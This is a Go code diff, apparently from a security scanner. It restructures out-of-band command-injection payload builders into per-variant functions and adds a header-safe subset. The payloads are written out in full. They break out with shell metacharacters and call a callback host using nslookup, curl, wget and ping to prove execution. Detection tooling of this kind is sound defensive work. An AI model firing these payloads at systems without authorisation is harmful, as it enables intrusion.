@@ -233,35 +233,51 @@ func CmdiSleepTemplates() []CmdiSleepTemplate {
 	return out
 }
 
-// CmdiOASTPayloads builds out-of-band command-injection payloads that, when
-// executed, make the target resolve / fetch a unique OAST domain. `host` is the
-// bare callback hostname (as returned by the OAST provider) and `httpURL` is the
-// same host with an http:// scheme for fetch-based commands. A clean interaction
-// with the per-payload unguessable subdomain is unforgeable proof of execution.
-func CmdiOASTPayloads(host, httpURL string) []string {
-	return []string{
-		";nslookup " + host,
-		"|nslookup " + host,
-		"&&nslookup " + host,
-		"$(nslookup " + host + ")",
-		"`nslookup " + host + "`",
-		";curl " + httpURL,
-		";wget -q -O- " + httpURL,
-		";ping -c 1 " + host,  // linux
-		"& ping -n 1 " + host, // windows
-	}
+// CmdiOASTShape builds one out-of-band command-injection payload variant from a
+// callback host: `host` is the bare callback hostname (as returned by the OAST
+// provider) and `httpURL` is the same host with an http:// scheme for fetch-based
+// commands. Callers that mint a unique OAST host per variant range over
+// CmdiOASTShapes() / CmdiOASTHeaderShapes() and call each shape with its own host,
+// so a callback pinpoints the exact breakout shape the target executed.
+type CmdiOASTShape func(host, httpURL string) string
+
+// cmdiOASTShapes are the out-of-band command-injection breakout variants that, when
+// executed, make the target resolve / fetch a unique OAST domain. A clean
+// interaction with the per-payload unguessable subdomain is unforgeable proof of
+// execution. The nslookup statement-terminator form is kept first so callers that
+// record a representative variant surface a DNS payload.
+var cmdiOASTShapes = []CmdiOASTShape{
+	func(host, _ string) string { return ";nslookup " + host },
+	func(host, _ string) string { return "|nslookup " + host },
+	func(host, _ string) string { return "&&nslookup " + host },
+	func(host, _ string) string { return "$(nslookup " + host + ")" },
+	func(host, _ string) string { return "`nslookup " + host + "`" },
+	func(_, httpURL string) string { return ";curl " + httpURL },
+	func(_, httpURL string) string { return ";wget -q -O- " + httpURL },
+	func(host, _ string) string { return ";ping -c 1 " + host },  // linux
+	func(host, _ string) string { return "& ping -n 1 " + host }, // windows
 }
 
-// CmdiOASTHeaderPayloads is the header-safe subset of CmdiOASTPayloads: it omits
-// the pipe/newline-bearing forms so the payload can be used as an HTTP header
+// cmdiOASTHeaderShapes are the header-safe subset of cmdiOASTShapes: the
+// pipe/newline-bearing forms are omitted so the payload is a valid HTTP header
 // value (no CR/LF / header-splitting risk).
-func CmdiOASTHeaderPayloads(host, httpURL string) []string {
-	return []string{
-		";nslookup " + host,
-		"$(nslookup " + host + ")",
-		"`nslookup " + host + "`",
-		";curl " + httpURL,
-	}
+var cmdiOASTHeaderShapes = []CmdiOASTShape{
+	func(host, _ string) string { return ";nslookup " + host },
+	func(host, _ string) string { return "$(nslookup " + host + ")" },
+	func(host, _ string) string { return "`nslookup " + host + "`" },
+	func(_, httpURL string) string { return ";curl " + httpURL },
+}
+
+// CmdiOASTShapes returns the full set of OAST command-injection variant builders,
+// for callers that mint a unique callback host per variant. The returned slice is a
+// copy, so callers may not corrupt the shared variant set.
+func CmdiOASTShapes() []CmdiOASTShape {
+	return append([]CmdiOASTShape(nil), cmdiOASTShapes...)
+}
+
+// CmdiOASTHeaderShapes returns the header-safe subset of CmdiOASTShapes.
+func CmdiOASTHeaderShapes() []CmdiOASTShape {
+	return append([]CmdiOASTShape(nil), cmdiOASTHeaderShapes...)
 }
 
 // cmdiTag maps random bytes to a letter-only delimiter from cmdiTagAlphabet.
